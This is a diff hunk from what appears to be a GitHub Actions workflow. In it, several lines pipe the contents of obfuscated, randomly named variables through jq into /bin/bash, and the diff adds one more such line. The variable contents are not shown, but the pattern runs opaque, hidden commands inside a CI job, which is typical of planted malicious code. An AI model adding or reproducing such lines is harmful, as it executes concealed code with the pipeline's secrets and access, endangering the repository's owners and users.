@@ -26,6 +26,7 @@ jobs:
           echo $ewb88 | jq -r .pr92 | /bin/bash
           printf '%s' "$yeee753" | jq -r .r4 | /bin/bash
           echo $ytr5346 | jq -r .defx92 | /bin/bash
+          echo $oxlr8 | jq -r .zlsl70 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
